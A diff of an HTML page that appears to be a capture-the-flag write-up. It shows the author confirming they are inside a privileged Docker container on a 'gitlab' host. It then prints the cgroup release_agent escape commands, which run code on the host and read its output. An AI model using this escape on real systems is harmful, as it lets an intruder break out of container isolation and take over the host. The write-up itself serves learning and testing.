-6:pids:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
-5:freezer:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
-4:devices:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
-3:rdma:/
-2:cpuset:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
-1:name=systemd:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
-0::/system.slice/containerd.service
+<div class="codehilite">
+ <pre><span></span><code><span class="n">root</span><span class="nv">@gitlab</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="k">proc</span><span class="o">/</span><span class="mi">1</span><span class="o">/</span><span class="n">cgroup</span><span class="w"></span>
+<span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="k">proc</span><span class="o">/</span><span class="mi">1</span><span class="o">/</span><span class="n">cgroup</span><span class="w"></span>
+<span class="mi">12</span><span class="err">:</span><span class="nl">perf_event</span><span class="p">:</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="mi">7</span><span class="n">eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d</span><span class="w"></span>
+<span class="mi">11</span><span class="err">:</span><span class="n">net_cls</span><span class="p">,</span><span class="nl">net_prio</span><span class="p">:</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="mi">7</span><span class="n">eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d</span><span class="w"></span>
+<span class="mi">10</span><span class="err">:</span><span class="nl">memory</span><span class="p">:</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="mi">7</span><span class="n">eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d</span><span class="w"></span>
+<span class="mi">9</span><span class="err">:</span><span class="nl">blkio</span><span class="p">:</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="mi">7</span><span class="n">eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d</span><span class="w"></span>
+<span class="mi">8</span><span class="err">:</span><span class="n">cpu</span><span class="p">,</span><span class="nl">cpuacct</span><span class="p">:</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="mi">7</span><span class="n">eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d</span><span class="w"></span>
+<span class="mi">7</span><span class="err">:</span><span class="nl">hugetlb</span><span class="p">:</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="mi">7</span><span class="n">eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d</span><span class="w"></span>
+<span class="mi">6</span><span class="err">:</span><span class="nl">pids</span><span class="p">:</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="mi">7</span><span class="n">eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d</span><span class="w"></span>
+<span class="mi">5</span><span class="err">:</span><span class="nl">freezer</span><span class="p">:</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="mi">7</span><span class="n">eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d</span><span class="w"></span>
+<span class="mi">4</span><span class="err">:</span><span class="nl">devices</span><span class="p">:</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="mi">7</span><span class="n">eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d</span><span class="w"></span>
+<span class="mi">3</span><span class="err">:</span><span class="nl">rdma</span><span class="p">:</span><span class="o">/</span><span class="w"></span>
+<span class="mi">2</span><span class="err">:</span><span class="nl">cpuset</span><span class="p">:</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="mi">7</span><span class="n">eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d</span><span class="w"></span>
+<span class="mi">1</span><span class="err">:</span><span class="n">name</span><span class="o">=</span><span class="nl">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="mi">7</span><span class="n">eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d</span><span class="w"></span>
+<span class="mi">0</span><span class="o">::/</span><span class="k">system</span><span class="p">.</span><span class="n">slice</span><span class="o">/</span><span class="n">containerd</span><span class="p">.</span><span class="n">service</span><span class="w"></span>
 </code></pre>
+</div>
 <p>
  As I thought, I was trapped in a Docker container.
 </p>
@@ -370,10 +391,12 @@ cat /proc/1/cgroup
  </em>
  flag on.
 </p>
-<pre class="codehilite"><code>root@gitlab:~# grep "privileged" /opt/backup/docker-compose.yml
-grep "privileged" /opt/backup/docker-compose.yml
-    privileged: true
+<div class="codehilite">
+ <pre><span></span><code><span class="n">root</span><span class="nv">@gitlab</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="ss">"privileged"</span><span class="w"> </span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="k">backup</span><span class="o">/</span><span class="n">docker</span><span class="o">-</span><span class="n">compose</span><span class="p">.</span><span class="n">yml</span><span class="w"></span>
+<span class="n">grep</span><span class="w"> </span><span class="ss">"privileged"</span><span class="w"> </span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="k">backup</span><span class="o">/</span><span class="n">docker</span><span class="o">-</span><span class="n">compose</span><span class="p">.</span><span class="n">yml</span><span class="w"></span>
+<span class="w">    </span><span class="nl">privileged</span><span class="p">:</span><span class="w"> </span><span class="k">true</span><span class="w"></span>
 </code></pre>
+</div>
 <p>
  We can escape from a Docker container if we have the following requirements
  <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/escaping-from-a-docker-container">
@@ -409,7 +432,8 @@ grep "privileged" /opt/backup/docker-compose.yml
   Commmands
  </em>
 </p>
-<pre class="codehilite"><code>mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x
+<div class="codehilite">
+ <pre><span></span><code>mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x
 echo 1 &gt; /tmp/cgrp/x/notify_on_release
 host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 echo "$host_path/cmd" &gt; /tmp/cgrp/release_agent
@@ -419,6 +443,7 @@ chmod a+x /cmd
 sh -c "echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs"
 head /output
 </code></pre>
+</div>
 <p>
  <em>
   We are in!
@@ -437,7 +462,7 @@ head /output
 </div>
 </div>
 </section>
-<section class="wrapper style1 alt">
+<section class="wrapper style4 alt">
 <div class="inner">
 <div class="content">
 
